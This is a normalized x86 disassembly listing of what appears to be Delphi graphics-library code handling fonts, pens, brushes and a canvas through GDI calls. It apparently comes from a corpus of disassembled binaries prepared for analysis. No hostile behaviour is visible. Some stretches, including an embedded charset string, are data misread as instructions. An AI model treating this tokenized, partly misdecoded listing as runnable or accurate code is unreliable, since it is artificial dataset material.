jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_40364c
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4236ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_423728
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_423764
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_4236d8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_42374c
xor edx edx
push ebp
push sub_423838
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42383f
mov eax [ ebp - 0x4 ]
call sub_423758
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407fac
test al al
je r-xdata
sub_423848
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_42374c
xor ecx ecx
push ebp
push sub_4238cf
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423758
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_4238f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42374c
xor eax eax
push ebp
push sub_423961
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423764
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_423848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423968
mov eax [ ebp - 0x4 ]
call sub_423758
retn
mov eax ebx
mov si 0xfffd
call sub_4034ac
sub_423970
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42374c
xor eax eax
push ebp
push sub_4239cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4239d3
mov eax [ ebp - 0x4 ]
call sub_423758
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4034ac
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423848
sub_4239dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42374c
xor edx edx
push ebp
push sub_423a3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a42
mov eax [ ebp - 0x4 ]
call sub_423758
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423a48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423ae5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov ebx eax
mov eax ebx
call sub_4252d4
inc [ ebp - 0x4 ]
mov eax ebx
call sub_425668
mov eax [ rw-data ]
call sub_4239dc
mov eax [ rw-data ]
call sub_4239dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423aec
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4189b0
call sub_425540
inc esi
dec ebx
jne r-xdata
sub_42413b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4182d4
retn
sub_42416c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402dc4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402bb4
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_424220
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423764
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_424274
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423848
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4242b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418fac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_424373
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423f78
xor eax eax
push ebp
push sub_424356
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423970
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4243f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42435d
mov eax [ ebp - 0x8 ]
call sub_423f88
retn
mov eax ebx
call sub_424678
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424694
sub_4243a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_4243e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4238f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243f0
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_424408
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424591
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424598
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_4040d0
retn
mov eax [ rw-data ]
call sub_42374c
xor eax eax
push ebp
push sub_424569
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423758
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404310
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4089a0
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404310
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4089a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404310
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4080b0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_4246ec
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_4245b0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_42416c
mov edx esp
mov eax ebx
call sub_4243a4
add esp 0x2c
pop esi
pop ebx
retn
sub_4245dc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_42438c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4243a4
add esp 0x2c
pop esi
pop ebx
retn
sub_42461c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_42438c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402cc4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404348
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402bb4
mov edx esp
mov eax ebx
call sub_4243a4
sub_424694
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4245dc
pop esi
pop ebx
retn
sub_4246c0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_42438c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4243a4
add esp 0x30
pop ebx
retn
sub_4246f4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42438c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4243a4
add esp 0x2c
pop esi
pop ebx
retn
sub_424724
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42438c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4243a4
add esp 0x2c
pop esi
pop ebx
retn
sub_42474c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423764
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_424790
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423848
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4247b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418fac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_424857
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423f78
xor eax eax
push ebp
push sub_42483a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423970
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4249a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424841
mov eax [ ebp - 0x8 ]
call sub_423f88
retn
sub_424870
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424888
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_4248cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4238f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248d4
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_4248e0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424870
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424888
add esp 0x10
pop esi
pop ebx
retn
sub_424908
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_42374c
xor eax eax
push ebp
push sub_42498e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423758
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423f34
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_4249bc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424870
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424888
add esp 0x10
pop esi
pop ebx
retn
sub_4249ec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424870
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424888
sub_424a18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423764
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_424a58
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423848
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_424a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418fac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_424b10
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423f78
xor eax eax
push ebp
push sub_424af3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424afa
mov eax [ ebp - 0x8 ]
call sub_423f88
retn
sub_424b28
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424b44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423f78
xor eax eax
push ebp
push sub_424b89
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4238f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b90
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_424b94
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424b44
add esp 0x10
pop edi
pop esi
retn
sub_424bc0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424b28
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424b44
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424bf4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_42374c
xor edx edx
push ebp
push sub_424cc1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423758
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423f34
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424cdc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424b28
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424b44
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424d10
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425890
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42474c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4258b0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a18
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4258d0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_418cec
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_424dd4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418d88
xor edx edx
mov eax esi
call sub_4256c8
mov eax [ esi + 0xc ]
call sub_4032b0
mov eax [ esi + 0x10 ]
call sub_4032b0
mov eax [ esi + 0x14 ]
call sub_4032b0
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_424e30
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_4252d4
xor eax eax
push ebp
push sub_4250d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42571c
mov eax [ ebp - 0x8 ]
call sub_428308
call sub_4252d4
xor eax eax
push ebp
push sub_4250b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov edi [ ebx + 0x8 ]
sub edi [ ebx ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_4283f4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_428568
mov eax [ ebp - 0x24 ]
call sub_428308
mov dl [ r-xdata ]
call sub_42571c
mov eax [ ebp - 0x24 ]
call sub_428308
mov eax [ eax + 0x4 ]
